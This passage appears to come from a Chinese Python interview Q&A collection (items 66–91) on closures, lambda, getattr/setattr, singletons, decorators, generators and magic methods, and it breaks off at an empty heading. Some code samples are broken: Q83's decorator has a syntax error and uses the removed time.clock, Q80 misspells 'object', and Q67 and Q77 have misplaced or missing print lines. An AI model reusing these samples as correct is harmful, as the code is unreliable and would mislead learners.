66.Python\u4e2dpass\u8bed\u53e5\u7684\u4f5c\u7528\u662f\u4ec0\u4e48\uff1f\n\n\u5728\u7f16\u5199\u4ee3\u7801\u65f6\u53ea\u5199\u6846\u67b6\u601d\u8def\uff0c\u5177\u4f53\u5b9e\u73b0\u8fd8\u672a\u7f16\u5199\u5c31\u53ef\u4ee5\u7528pass\u8fdb\u884c\u5360\u4f4d\uff0c\u662f\u7a0b\u5e8f\u4e0d\u62a5\u9519\uff0c\u4e0d\u4f1a\u8fdb\u884c\u4efb\u4f55\u64cd\u4f5c\u3002\n\n### 67.\u6709\u8fd9\u6837\u4e00\u6bb5\u4ee3\u7801\uff0cprint c\u4f1a\u8f93\u51fa\u4ec0\u4e48\uff0c\u4e3a\u4ec0\u4e48\uff1f\n\n```python\na = 10\nb = 20\nc = [a]\na = 15\n```\n\n\u7b54\uff1a10\u5bf9\u4e8e\u5b57\u7b26\u4e32\uff0c\u6570\u5b57\uff0c\u4f20\u9012\u662f\u76f8\u5e94\u7684\u503c\n\n\n\n### 68.\u4ea4\u6362\u4e24\u4e2a\u53d8\u91cf\u7684\u503c\uff1f\n\n```python\na, b = b, a\n```\n\n\n\n### 69.map\u51fd\u6570\u548creduce\u51fd\u6570\uff1f\n\n```python\nmap(lambda x: x * x, [1, 2, 3, 4])   # \u4f7f\u7528 lambda\n# [1, 4, 9, 16]\nreduce(lambda x, y: x * y, [1, 2, 3, 4])  # \u76f8\u5f53\u4e8e ((1 * 2) * 3) * 4\n# 24\n```\n\n\n\n### 70.\u56de\u8c03\u51fd\u6570\uff0c\u5982\u4f55\u901a\u4fe1\u7684?\n\n\u56de\u8c03\u51fd\u6570\u662f\u628a\u51fd\u6570\u7684\u6307\u9488(\u5730\u5740)\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9\u53e6\u4e00\u4e2a\u51fd\u6570\uff0c\u5c06\u6574\u4e2a\u51fd\u6570\u5f53\u4f5c\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8d4b\u503c\u7ed9\u8c03\u7528\u7684\u51fd\u6570\u3002\n\n### 71.Python\u4e3b\u8981\u7684\u5185\u7f6e\u6570\u636e\u7c7b\u578b\u90fd\u6709\u54ea\u4e9b\uff1f print dir( \u2018a \u2019) \u7684\u8f93\u51fa\uff1f\n\n\u5185\u5efa\u7c7b\u578b\uff1a\u5e03\u5c14\u7c7b\u578b\uff0c\u6570\u5b57\uff0c\u5b57\u7b26\u4e32\uff0c\u5217\u8868\uff0c\u5143\u7ec4\uff0c\u5b57\u5178\uff0c\u96c6\u5408\n\n\u8f93\u51fa\u5b57\u7b26\u4e32'a'\u7684\u5185\u5efa\u65b9\u6cd5\n\n### 72.map(lambda x:xx\uff0c[y for y in range(3)])\u7684\u8f93\u51fa\uff1f\n\n```\n[0, 1, 4]\n```\n\n### 73.hasattr() getattr() setattr() \u51fd\u6570\u4f7f\u7528\u8be6\u89e3\uff1f\n\nhasattr(object,name)\u51fd\u6570:\n\n\u5224\u65ad\u4e00\u4e2a\u5bf9\u8c61\u91cc\u9762\u662f\u5426\u6709name\u5c5e\u6027\u6216\u8005name\u65b9\u6cd5\uff0c\u8fd4\u56debool\u503c\uff0c\u6709name\u5c5e\u6027\uff08\u65b9\u6cd5\uff09\u8fd4\u56deTrue\uff0c\u5426\u5219\u8fd4\u56deFalse\u3002\n\n```python\nclass function_demo(object):\n    name = 'demo'\n    def run(self):\n        return \"hello function\"\nfunctiondemo = function_demo()\nres = hasattr(functiondemo, \"name\") # \u5224\u65ad\u5bf9\u8c61\u662f\u5426\u6709name\u5c5e\u6027\uff0cTrue\nres = hasattr(functiondemo, \"run\") # \u5224\u65ad\u5bf9\u8c61\u662f\u5426\u6709run\u65b9\u6cd5\uff0cTrue\nres = hasattr(functiondemo, \"age\") # \u5224\u65ad\u5bf9\u8c61\u662f\u5426\u6709age\u5c5e\u6027\uff0cFalse\nprint(res)\n```\n\ngetattr(object, name[,default])\u51fd\u6570\uff1a\n\n\u83b7\u53d6\u5bf9\u8c61object\u7684\u5c5e\u6027\u6216\u8005\u65b9\u6cd5\uff0c\u5982\u679c\u5b58\u5728\u5219\u6253\u5370\u51fa\u6765\uff0c\u5982\u679c\u4e0d\u5b58\u5728\uff0c\u6253\u5370\u9ed8\u8ba4\u503c\uff0c\u9ed8\u8ba4\u503c\u53ef\u9009\u3002\u6ce8\u610f\uff1a\u5982\u679c\u8fd4\u56de\u7684\u662f\u5bf9\u8c61\u7684\u65b9\u6cd5\uff0c\u5219\u6253\u5370\u7ed3\u679c\u662f\uff1a\u65b9\u6cd5\u7684\u5185\u5b58\u5730\u5740\uff0c\u5982\u679c\u9700\u8981\u8fd0\u884c\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5728\u540e\u9762\u6dfb\u52a0\u62ec\u53f7().\n\n```python\nfunctiondemo = function_demo()\ngetattr(functiondemo, \"name\")# \u83b7\u53d6name\u5c5e\u6027\uff0c\u5b58\u5728\u5c31\u6253\u5370\u51fa\u6765 --- demo\ngetattr(functiondemo, \"run\") # \u83b7\u53d6run \u65b9\u6cd5\uff0c\u5b58\u5728\u6253\u5370\u51fa\u65b9\u6cd5\u7684\u5185\u5b58\u5730\u5740\ngetattr(functiondemo, \"age\") # \u83b7\u53d6\u4e0d\u5b58\u5728\u7684\u5c5e\u6027\uff0c\u62a5\u9519\ngetattr(functiondemo, \"age\", 18)# \u83b7\u53d6\u4e0d\u5b58\u5728\u7684\u5c5e\u6027\uff0c\u8fd4\u56de\u4e00\u4e2a\u9ed8\u8ba4\u503c\n```\n\nsetattr(object, name, values)\u51fd\u6570\uff1a\n\n\u7ed9\u5bf9\u8c61\u7684\u5c5e\u6027\u8d4b\u503c\uff0c\u82e5\u5c5e\u6027\u4e0d\u5b58\u5728\uff0c\u5148\u521b\u5efa\u518d\u8d4b\u503c\n\n```python\nclass function_demo(object):\n    name = \"demo\"\n    def run(self):\n        return \"hello function\"\nfunctiondemo = function_demo()\nres = hasattr(functiondemo, \"age\") # \u5224\u65adage\u5c5e\u6027\u662f\u5426\u5b58\u5728\uff0cFalse\nprint(res)\nsetattr(functiondemo, \"age\", 18) # \u5bf9age\u5c5e\u6027\u8fdb\u884c\u8d4b\u503c\uff0c\u65e0\u8fd4\u56de\u503c\nres1 = hasattr(functiondemo, \"age\") # \u518d\u6b21\u5224\u65ad\u5c5e\u6027\u662f\u5426\u5b58\u5728\uff0cTrue\n```\n\n\u7efc\u5408\u4f7f\u7528\n\n```python\nclass function_demo(object):\n    name = \"demo\"\n    def run(self):\n        return \"hello function\"\nfunctiondemo = function_demo()\nres = hasattr(functiondemo, \"addr\") # \u5148\u5224\u65ad\u662f\u5426\u5b58\u5728\nif res:\n    addr = getattr(functiondemo, \"addr\")\n    print(addr)\nelse:\n    addr = getattr(functiondemo, \"addr\", setattr(functiondemo, \"addr\", \"\u5317\u4eac\u9996\u90fd\"))\n    print(addr)\n```\n\n\n\n### 74.\u4e00\u53e5\u8bdd\u89e3\u51b3\u9636\u4e58\u51fd\u6570\uff1f\n\n```\nreduce(lambda x,y : x*y,range(1,n+1))\n```\n\n\n\n### 75.\u4ec0\u4e48\u662flambda\u51fd\u6570\uff1f \u6709\u4ec0\u4e48\u597d\u5904\uff1f\n\nlambda \u51fd\u6570\u662f\u4e00\u4e2a\u53ef\u4ee5\u63a5\u6536\u4efb\u610f\u591a\u4e2a\u53c2\u6570(\u5305\u62ec\u53ef\u9009\u53c2\u6570)\u5e76\u4e14\u8fd4\u56de\u5355\u4e2a\u8868\u8fbe\u5f0f\u503c\u7684\u51fd\u6570\n\n1.lambda\u51fd\u6570\u6bd4\u8f83\u8f7b\u4fbf\uff0c\u5373\u7528\u5373\u4ecd\uff0c\u5f88\u9002\u5408\u9700\u8981\u5b8c\u6210\u4e00\u9879\u529f\u80fd\uff0c\u4f46\u662f\u6b64\u529f\u80fd\u53ea\u5728\u6b64\u4e00\u5904\u4f7f\u7528\uff0c\u8fde\u540d\u5b57\u90fd\u5f88\u968f\u610f\u7684\u60c5\u51b5\u4e0b\n\n2.\u533f\u540d\u51fd\u6570\uff0c\u4e00\u822c\u7528\u6765\u7ed9filter\uff0cmap\u8fd9\u6837\u7684\u51fd\u6570\u5f0f\u7f16\u7a0b\u670d\u52a1\n\n3.\u4f5c\u4e3a\u56de\u8c03\u51fd\u6570\uff0c\u4f20\u9012\u7ed9\u67d0\u4e9b\u5e94\u7528\uff0c\u6bd4\u5982\u6d88\u606f\u5904\u7406\n\n### 76.\u9012\u5f52\u51fd\u6570\u505c\u6b62\u7684\u6761\u4ef6\uff1f\n\n\u9012\u5f52\u7684\u7ec8\u6b62\u6761\u4ef6\u4e00\u822c\u5b9a\u4e49\u5728\u9012\u5f52\u51fd\u6570\u5185\u90e8\uff0c\u5728\u9012\u5f52\u8c03\u7528\u524d\u8981\u505a\u4e00\u4e2a\u6761\u4ef6\u5224\u65ad\uff0c\u6839\u636e\u5224\u65ad\u7684\u7ed3\u679c\u9009\u62e9\u662f\u7ee7\u7eed\u8c03\u7528\u81ea\u8eab\uff0c\u8fd8\u662freturn\uff0c\uff0c\u8fd4\u56de\u7ec8\u6b62\u9012\u5f52\u3002\n\n\u7ec8\u6b62\u7684\u6761\u4ef6\uff1a\u5224\u65ad\u9012\u5f52\u7684\u6b21\u6570\u662f\u5426\u8fbe\u5230\u67d0\u4e00\u9650\u5b9a\u503c\n\n2.\u5224\u65ad\u8fd0\u7b97\u7684\u7ed3\u679c\u662f\u5426\u8fbe\u5230\u67d0\u4e2a\u8303\u56f4\u7b49\uff0c\u6839\u636e\u8bbe\u8ba1\u7684\u76ee\u7684\u6765\u9009\u62e9\n\n### 77.\u4e0b\u9762\u8fd9\u6bb5\u4ee3\u7801\u7684\u8f93\u51fa\u7ed3\u679c\u5c06\u662f\u4ec0\u4e48\uff1f\u8bf7\u89e3\u91ca\u3002\n\n```python\ndef multipliers():\n    return [lambda x: i *x for i in range(4)]\n\tprint([m(2) for m in multipliers()])\n\n```\n\n\u4e0a\u9762\u4ee3\u7801\u7684\u8f93\u51fa\u7ed3\u679c\u662f[6,6,6,6]\uff0c\u4e0d\u662f\u6211\u4eec\u60f3\u7684[0,2,4,6]\n\n\u4f60\u5982\u4f55\u4fee\u6539\u4e0a\u9762\u7684multipliers\u7684\u5b9a\u4e49\u4ea7\u751f\u60f3\u8981\u7684\u7ed3\u679c\uff1f\n\n\u4e0a\u8ff0\u95ee\u9898\u4ea7\u751f\u7684\u539f\u56e0\u662fpython\u95ed\u5305\u7684\u5ef6\u8fdf\u7ed1\u5b9a\u3002\u8fd9\u610f\u5473\u7740\u5185\u90e8\u51fd\u6570\u88ab\u8c03\u7528\u65f6\uff0c\u53c2\u6570\u7684\u503c\u5728\u95ed\u5305\u5185\u8fdb\u884c\u67e5\u627e\u3002\u56e0\u6b64\uff0c\u5f53\u4efb\u4f55\u7531multipliers()\u8fd4\u56de\u7684\u51fd\u6570\u88ab\u8c03\u7528\u65f6,i\u7684\u503c\u5c06\u5728\u9644\u8fd1\u7684\u8303\u56f4\u8fdb\u884c\u67e5\u627e\u3002\u90a3\u65f6\uff0c\u4e0d\u7ba1\u8fd4\u56de\u7684\u51fd\u6570\u662f\u5426\u88ab\u8c03\u7528\uff0cfor\u5faa\u73af\u5df2\u7ecf\u5b8c\u6210\uff0ci\u88ab\u8d4b\u4e88\u4e86\u6700\u7ec8\u7684\u503c3.\n\n```python\ndef multipliers():\n    for i in range(4):\n        yield lambda x: i *x\n```\n\n```python\ndef multipliers():\n    return [lambda x,i = i: i*x for i in range(4)]\n\n```\n\n\n\n\n\n### 78.\u4ec0\u4e48\u662flambda\u51fd\u6570\uff1f\u5b83\u6709\u4ec0\u4e48\u597d\u5904\uff1f\u5199\u4e00\u4e2a\u533f\u540d\u51fd\u6570\u6c42\u4e24\u4e2a\u6570\u7684\u548c\n\nlambda\u51fd\u6570\u662f\u533f\u540d\u51fd\u6570\uff0c\u4f7f\u7528lambda\u51fd\u6570\u80fd\u521b\u5efa\u5c0f\u578b\u533f\u540d\u51fd\u6570\uff0c\u8fd9\u79cd\u51fd\u6570\u5f97\u540d\u4e8e\u7701\u7565\u4e86\u7528def\u58f0\u660e\u51fd\u6570\u7684\u6807\u51c6\u6b65\u9aa4\n\n\n##  \u8bbe\u8ba1\u6a21\u5f0f\n### 79.\u5bf9\u8bbe\u8ba1\u6a21\u5f0f\u7684\u7406\u89e3\uff0c\u7b80\u8ff0\u4f60\u4e86\u89e3\u7684\u8bbe\u8ba1\u6a21\u5f0f\uff1f\n\u8bbe\u8ba1\u6a21\u5f0f\u662f\u7ecf\u8fc7\u603b\u7ed3\uff0c\u4f18\u5316\u7684\uff0c\u5bf9\u6211\u4eec\u7ecf\u5e38\u4f1a\u78b0\u5230\u7684\u4e00\u4e9b\u7f16\u7a0b\u95ee\u9898\u7684\u53ef\u91cd\u7528\u89e3\u51b3\u65b9\u6848\u3002\u4e00\u4e2a\u8bbe\u8ba1\u6a21\u5f0f\u5e76\u4e0d\u50cf\u4e00\u4e2a\u7c7b\u6216\u4e00\u4e2a\u5e93\u90a3\u6837\u80fd\u591f\u76f4\u63a5\u4f5c\u7528\u4e8e\u6211\u4eec\u7684\u4ee3\u7801\uff0c\u53cd\u4e4b\uff0c\u8bbe\u8ba1\u6a21\u5f0f\u66f4\u4e3a\u9ad8\u7ea7\uff0c\u5b83\u662f\u4e00\u79cd\u5fc5\u987b\u5728\u7279\u5b9a\u60c5\u5f62\u4e0b\u5b9e\u73b0\u7684\u4e00\u79cd\u65b9\u6cd5\u6a21\u677f\u3002\n\u5e38\u89c1\u7684\u662f\u5de5\u5382\u6a21\u5f0f\u548c\u5355\u4f8b\u6a21\u5f0f\n\n### 80.\u8bf7\u624b\u5199\u4e00\u4e2a\u5355\u4f8b\n```python\n#python2\nclass A(object):\n    __instance = None\n    def __new__(cls,*args,**kwargs):\n        if cls.__instance is None:\n            cls.__instance = objecet.__new__(cls)\n            return cls.__instance\n        else:\n            return cls.__instance\n```\n### 81.\u5355\u4f8b\u6a21\u5f0f\u7684\u5e94\u7528\u573a\u666f\u6709\u90a3\u4e9b\uff1f\n\u5355\u4f8b\u6a21\u5f0f\u5e94\u7528\u7684\u573a\u666f\u4e00\u822c\u53d1\u73b0\u5728\u4ee5\u4e0b\u6761\u4ef6\u4e0b\uff1a\n\u8d44\u6e90\u5171\u4eab\u7684\u60c5\u51b5\u4e0b\uff0c\u907f\u514d\u7531\u4e8e\u8d44\u6e90\u64cd\u4f5c\u65f6\u5bfc\u81f4\u7684\u6027\u80fd\u6216\u635f\u8017\u7b49\uff0c\u5982\u65e5\u5fd7\u6587\u4ef6\uff0c\u5e94\u7528\u914d\u7f6e\u3002\n\u63a7\u5236\u8d44\u6e90\u7684\u60c5\u51b5\u4e0b\uff0c\u65b9\u4fbf\u8d44\u6e90\u4e4b\u95f4\u7684\u4e92\u76f8\u901a\u4fe1\u3002\u5982\u7ebf\u7a0b\u6c60\u7b49\uff0c1,\u7f51\u7ad9\u7684\u8ba1\u6570\u5668 2,\u5e94\u7528\u914d\u7f6e 3.\u591a\u7ebf\u7a0b\u6c60 4\u6570\u636e\u5e93\u914d\u7f6e \u6570\u636e\u5e93\u8fde\u63a5\u6c60 5.\u5e94\u7528\u7a0b\u5e8f\u7684\u65e5\u5fd7\u5e94\u7528...\n### 82.\u7528\u4e00\u884c\u4ee3\u7801\u751f\u6210[1,4,9,16,25,36,49,64,81,100]\n```python\nprint([x*x for x in range(1, 11)])\n```\n### 83.\u5bf9\u88c5\u9970\u5668\u7684\u7406\u89e3\uff0c\u5e76\u5199\u51fa\u4e00\u4e2a\u8ba1\u65f6\u5668\u8bb0\u5f55\u65b9\u6cd5\u6267\u884c\u6027\u80fd\u7684\u88c5\u9970\u5668\uff1f\n\u88c5\u9970\u5668\u672c\u8d28\u4e0a\u662f\u4e00\u4e2acallable object \uff0c\u5b83\u53ef\u4ee5\u8ba9\u5176\u4ed6\u51fd\u6570\u5728\u4e0d\u9700\u8981\u505a\u4efb\u4f55\u4ee3\u7801\u53d8\u52a8\u7684\u524d\u63d0\u4e0b\u589e\u52a0\u989d\u5916\u529f\u80fd\uff0c\u88c5\u9970\u5668\u7684\u8fd4\u56de\u503c\u4e5f\u662f\u4e00\u4e2a\u51fd\u6570\u5bf9\u8c61\u3002\n\n```python\nimport time\nfrom functools import wraps\n\ndef timeit(func):\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n        start = time.clock()\n        ret = func(*args, **kwargs)\n        end = time.clock()\n        print('used:',end-start)\n        return ret\n    \n    return wrapper\n@timeit\ndef foo():\n    print('in foo()'foo())\n```\n### 84.\u89e3\u91ca\u4ee5\u4e0b\u4ec0\u4e48\u662f\u95ed\u5305\uff1f\n\u5728\u51fd\u6570\u5185\u90e8\u518d\u5b9a\u4e49\u4e00\u4e2a\u51fd\u6570\uff0c\u5e76\u4e14\u8fd9\u4e2a\u51fd\u6570\u7528\u5230\u4e86\u5916\u8fb9\u51fd\u6570\u7684\u53d8\u91cf\uff0c\u90a3\u4e48\u5c06\u8fd9\u4e2a\u51fd\u6570\u4ee5\u53ca\u7528\u5230\u7684\u4e00\u4e9b\u53d8\u91cf\u79f0\u4e4b\u4e3a\u95ed\u5305\u3002\n\n### 85.\u51fd\u6570\u88c5\u9970\u5668\u6709\u4ec0\u4e48\u4f5c\u7528\uff1f\n\u88c5\u9970\u5668\u672c\u8d28\u4e0a\u662f\u4e00\u4e2acallable object\uff0c\u5b83\u53ef\u4ee5\u5728\u8ba9\u5176\u4ed6\u51fd\u6570\u5728\u4e0d\u9700\u8981\u505a\u4efb\u4f55\u4ee3\u7801\u7684\u53d8\u52a8\u7684\u524d\u63d0\u4e0b\u589e\u52a0\u989d\u5916\u7684\u529f\u80fd\u3002\u88c5\u9970\u5668\u7684\u8fd4\u56de\u503c\u4e5f\u662f\u4e00\u4e2a\u51fd\u6570\u7684\u5bf9\u8c61\uff0c\u5b83\u7ecf\u5e38\u7528\u4e8e\u6709\u5207\u9762\u9700\u6c42\u7684\u573a\u666f\u3002\u6bd4\u5982\uff1a\u63d2\u5165\u65e5\u5fd7\uff0c\u6027\u80fd\u6d4b\u8bd5\uff0c\u4e8b\u52a1\u5904\u7406\uff0c\u7f13\u5b58\u3002\u6743\u9650\u7684\u6821\u9a8c\u7b49\u573a\u666f\uff0c\u6709\u4e86\u88c5\u9970\u5668\u5c31\u53ef\u4ee5\u62bd\u79bb\u51fa\u5927\u91cf\u7684\u4e0e\u51fd\u6570\u529f\u80fd\u672c\u8eab\u65e0\u5173\u7684\u96f7\u540c\u4ee3\u7801\u5e76\u53d1\u5e76\u7ee7\u7eed\u4f7f\u7528\u3002\n\u8be6\u7ec6\u53c2\u8003\uff1ahttps:\/\/manjusaka.itscoder.com\/2018\/02\/23\/something-about-decorator\/\n\n### 86.\u751f\u6210\u5668\uff0c\u8fed\u4ee3\u5668\u7684\u533a\u522b\uff1f\n\u8fed\u4ee3\u5668\u662f\u9075\u5faa\u8fed\u4ee3\u534f\u8bae\u7684\u5bf9\u8c61\u3002\u7528\u6237\u53ef\u4ee5\u4f7f\u7528 iter() \u4ee5\u4ece\u4efb\u4f55\u5e8f\u5217\u5f97\u5230\u8fed\u4ee3\u5668\uff08\u5982 list, tuple, dictionary, set \u7b49\uff09\u3002\u53e6\u4e00\u4e2a\u65b9\u6cd5\u5219\u662f\u521b\u5efa\u4e00\u4e2a\u53e6\u4e00\u79cd\u5f62\u5f0f\u7684\u8fed\u4ee3\u5668 \u2014\u2014 generator \u3002\u8981\u83b7\u53d6\u4e0b\u4e00\u4e2a\u5143\u7d20\uff0c\u5219\u4f7f\u7528\u6210\u5458\u51fd\u6570 next()\uff08Python 2\uff09\u6216\u51fd\u6570 next() function \uff08Python 3\uff09 \u3002\u5f53\u6ca1\u6709\u5143\u7d20\u65f6\uff0c\u5219\u5f15\u53d1 StopIteration \u6b64\u4f8b\u5916\u3002\u82e5\u8981\u5b9e\u73b0\u81ea\u5df1\u7684\u8fed\u4ee3\u5668\uff0c\u5219\u53ea\u8981\u5b9e\u73b0 next()\uff08Python 2\uff09\u6216 `__next__`()\uff08 Python 3\uff09\n\n\u751f\u6210\u5668\uff08Generator\uff09\uff0c\u53ea\u662f\u5728\u9700\u8981\u8fd4\u56de\u6570\u636e\u7684\u65f6\u5019\u4f7f\u7528yield\u8bed\u53e5\u3002\u6bcf\u6b21next()\u88ab\u8c03\u7528\u65f6\uff0c\u751f\u6210\u5668\u4f1a\u8fd4\u56de\u5b83\u8131\u79bb\u7684\u4f4d\u7f6e\uff08\u5b83\u8bb0\u5fc6\u8bed\u53e5\u6700\u540e\u4e00\u6b21\u6267\u884c\u7684\u4f4d\u7f6e\u548c\u6240\u6709\u7684\u6570\u636e\u503c\uff09\n\n\n\u533a\u522b\uff1a \u751f\u6210\u5668\u80fd\u505a\u5230\u8fed\u4ee3\u5668\u80fd\u505a\u7684\u6240\u6709\u4e8b\uff0c\u800c\u4e14\u56e0\u4e3a\u81ea\u52a8\u521b\u5efaiter()\u548cnext()\u65b9\u6cd5\uff0c\u751f\u6210\u5668\u663e\u5f97\u7279\u522b\u7b80\u6d01\uff0c\u800c\u4e14\u751f\u6210\u5668\u4e5f\u662f\u9ad8\u6548\u7684\uff0c\u4f7f\u7528\u751f\u6210\u5668\u8868\u8fbe\u5f0f\u53d6\u4ee3\u5217\u8868\u89e3\u6790\u53ef\u4ee5\u540c\u65f6\u8282\u7701\u5185\u5b58\u3002\u9664\u4e86\u521b\u5efa\u548c\u4fdd\u5b58\u7a0b\u5e8f\u72b6\u6001\u7684\u81ea\u52a8\u65b9\u6cd5\uff0c\u5f53\u53d1\u751f\u5668\u7ec8\u7ed3\u65f6\uff0c\u8fd8\u4f1a\u81ea\u52a8\u629b\u51faStopIteration\u5f02\u5e38\u3002\n\n\u5b98\u65b9\u4ecb\u7ecd\uff1ahttps:\/\/docs.python.org\/3\/tutorial\/classes.html#iterators\n### 87.X\u662f\u4ec0\u4e48\u7c7b\u578b?\n    X= (i for i in range(10))\n    X\u662f generator\u7c7b\u578b\n### 88.\u8bf7\u7528\u4e00\u884c\u4ee3\u7801 \u5b9e\u73b0\u5c061-N \u7684\u6574\u6570\u5217\u8868\u4ee53\u4e3a\u5355\u4f4d\u5206\u7ec4\n```python\nN =100\nprint ([[x for x in range(1,100)] [i:i+3] for i in range(0,100,3)])\n```\n### 89.Python\u4e2dyield\u7684\u7528\u6cd5?\nyield\u5c31\u662f\u4fdd\u5b58\u5f53\u524d\u7a0b\u5e8f\u6267\u884c\u72b6\u6001\u3002\u4f60\u7528for\u5faa\u73af\u7684\u65f6\u5019\uff0c\u6bcf\u6b21\u53d6\u4e00\u4e2a\u5143\u7d20\u7684\u65f6\u5019\u5c31\u4f1a\u8ba1\u7b97\u4e00\u6b21\u3002\u7528yield\u7684\u51fd\u6570\u53ebgenerator,\u548citerator\u4e00\u6837\uff0c\u5b83\u7684\u597d\u5904\u662f\u4e0d\u7528\u4e00\u6b21\u8ba1\u7b97\u6240\u6709\u5143\u7d20\uff0c\u800c\u662f\u7528\u4e00\u6b21\u7b97\u4e00\u6b21\uff0c\u53ef\u4ee5\u8282\u7701\u5f88\u591a\u7a7a\u95f4\uff0cgenerator\u6bcf\u6b21\u8ba1\u7b97\u9700\u8981\u4e0a\u4e00\u6b21\u8ba1\u7b97\u7ed3\u679c\uff0c\u6240\u4ee5\u7528yield,\u5426\u5219\u4e00return\uff0c\u4e0a\u6b21\u8ba1\u7b97\u7ed3\u679c\u5c31\u6ca1\u4e86\n## \u9762\u5411\u5bf9\u8c61\n### 90.Python\u4e2d\u7684\u53ef\u53d8\u5bf9\u8c61\u548c\u4e0d\u53ef\u53d8\u5bf9\u8c61\uff1f\n\n\u4e0d\u53ef\u53d8\u5bf9\u8c61\uff0c\u8be5\u5bf9\u8c61\u6240\u6307\u5411\u7684\u5185\u5b58\u4e2d\u7684\u503c\u4e0d\u80fd\u88ab\u6539\u53d8\u3002\u5f53\u6539\u53d8\u67d0\u4e2a\u53d8\u91cf\u65f6\u5019\uff0c\u7531\u4e8e\u5176\u6240\u6307\u7684\u503c\u4e0d\u80fd\u88ab\u6539\u53d8\uff0c\u76f8\u5f53\u4e8e\u628a\u539f\u6765\u7684\u503c\u590d\u5236\u4e00\u4efd\u540e\u518d\u6539\u53d8\uff0c\u8fd9\u4f1a\u5f00\u8f9f\u4e00\u4e2a\u65b0\u7684\u5730\u5740\uff0c\u53d8\u91cf\u518d\u6307\u5411\u8fd9\u4e2a\u65b0\u7684\u5730\u5740\u3002\n\n\u53ef\u53d8\u5bf9\u8c61\uff0c\u8be5\u5bf9\u8c61\u6240\u6307\u5411\u7684\u5185\u5b58\u4e2d\u7684\u503c\u53ef\u4ee5\u88ab\u6539\u53d8\u3002\u53d8\u91cf\uff08\u51c6\u786e\u7684\u8bf4\u662f\u5f15\u7528\uff09\u6539\u53d8\u540e\uff0c\u5b9e\u9645\u4e0a\u5176\u6240\u6307\u7684\u503c\u76f4\u63a5\u53d1\u751f\u6539\u53d8\uff0c\u5e76\u6ca1\u6709\u53d1\u751f\u590d\u5236\u884c\u4e3a\uff0c\u4e5f\u6ca1\u6709\u5f00\u8f9f\u51fa\u65b0\u7684\u5730\u5740\uff0c\u901a\u4fd7\u70b9\u8bf4\u5c31\u662f\u539f\u5730\u6539\u53d8\u3002\n\nPyhton\u4e2d\uff0c\u6570\u503c\u7c7b\u578b(int \u548cfloat)\uff0c\u5b57\u7b26\u4e32str\u3001\u5143\u7956tuple\u90fd\u662f\u4e0d\u53ef\u53d8\u7c7b\u578b\u3002\u800c\u5217\u8868list\u3001\u5b57\u5178dict\u3001\u96c6\u5408set\u662f\u53ef\u53d8\u7c7b\u578b\n\n### 91.Python\u7684\u9b54\u6cd5\u65b9\u6cd5\n\n\u9b54\u6cd5\u65b9\u6cd5\u5c31\u662f\u53ef\u4ee5\u7ed9\u4f60\u7684\u7c7b\u589e\u52a0\u9b54\u529b\u7684\u7279\u6b8a\u65b9\u6cd5\uff0c\u5982\u679c\u4f60\u7684\u5bf9\u8c61\u5b9e\u73b0\uff08\u91cd\u8f7d\uff09\u4e86\u8fd9\u4e9b\u65b9\u6cd5\u4e2d\u7684\u67d0\u4e00\u4e2a\uff0c\u90a3\u4e48\u8fd9\u4e2a\u65b9\u6cd5\u5c31\u4f1a\u5728\u7279\u6b8a\u7684\u60c5\u51b5\u4e0b\u88abPython\u6240\u8c03\u7528\uff0c\u4f60\u53ef\u4ee5\u5b9a\u4e49\u81ea\u5df1\u60f3\u8981\u7684\u884c\u4e3a\uff0c\u800c\u8fd9\u4e00\u5207\u90fd\u662f\u81ea\u52a8\u53d1\u751f\u7684\uff0c\u5b83\u4eec\u7ecf\u5e38\u662f\u4e24\u4e2a\u4e0b\u5212\u7ebf\u5305\u56f4\u6765\u547d\u540d\u7684\uff08\u6bd4\u5982`__init___`,`__len__`),Python\u7684\u9b54\u6cd5\u65b9\u6cd5\u662f\u975e\u5e38\u5f3a\u5927\u7684\u6240\u4ee5\u4e86\u89e3\u5176\u4f7f\u7528\u65b9\u6cd5\u4e5f\u53d8\u5f97\u5c24\u4e3a\u91cd\u8981!\n\n`__init__`\u6784\u9020\u5668\uff0c\u5f53\u4e00\u4e2a\u5b9e\u4f8b\u88ab\u521b\u5efa\u7684\u65f6\u5019\u521d\u59cb\u5316\u7684\u65b9\u6cd5\uff0c\u4f46\u662f\u5b83\u5e76\u4e0d\u662f\u5b9e\u4f8b\u5316\u8c03\u7528\u7684\u7b2c\u4e00\u4e2a\u65b9\u6cd5\u3002\n\n`__new__`\u624d\u662f\u5b9e\u4f8b\u5316\u5bf9\u8c61\u8c03\u7528\u7684\u7b2c\u4e00\u4e2a\u65b9\u6cd5\uff0c\u5b83\u53ea\u53d6\u4e0bcls\u53c2\u6570\uff0c\u5e76\u628a\u5176\u4ed6\u53c2\u6570\u4f20\u7ed9`__init___`.\n\n`___new__`\u5f88\u5c11\u4f7f\u7528\uff0c\u4f46\u662f\u4e5f\u6709\u5b83\u9002\u5408\u7684\u573a\u666f\uff0c\u5c24\u5176\u662f\u5f53\u7c7b\u7ee7\u627f\u81ea\u4e00\u4e2a\u50cf\u5143\u7956\u6216\u8005\u5b57\u7b26\u4e32\u8fd9\u6837\u4e0d\u7ecf\u5e38\u6539\u53d8\u7684\u7c7b\u578b\u7684\u65f6\u5019\u3002\n\n`__call__`\u8ba9\u4e00\u4e2a\u7c7b\u7684\u5b9e\u4f8b\u50cf\u51fd\u6570\u4e00\u6837\u88ab\u8c03\u7528\n\n`__getitem__`\u5b9a\u4e49\u83b7\u53d6\u5bb9\u5668\u4e2d\u6307\u5b9a\u5143\u7d20\u7684\u884c\u4e3a\uff0c\u76f8\u5f53\u4e8eself[key]\n\n`__getattr__`\u5b9a\u4e49\u5f53\u7528\u6237\u8bd5\u56fe\u8bbf\u95ee\u4e00\u4e2a\u4e0d\u5b58\u5728\u5c5e\u6027\u7684\u65f6\u5019\u7684\u884c\u4e3a\u3002\n\n`__setattr__`\u5b9a\u4e49\u5f53\u4e00\u4e2a\u5c5e\u6027\u88ab\u8bbe\u7f6e\u7684\u65f6\u5019\u7684\u884c\u4e3a\n\n`__getattribute___`\u5b9a\u4e49\u5f53\u4e00\u4e2a\u5c5e\u6027\u88ab\u8bbf\u95ee\u7684\u65f6\u5019\u7684\u884c\u4e3a\n\n### 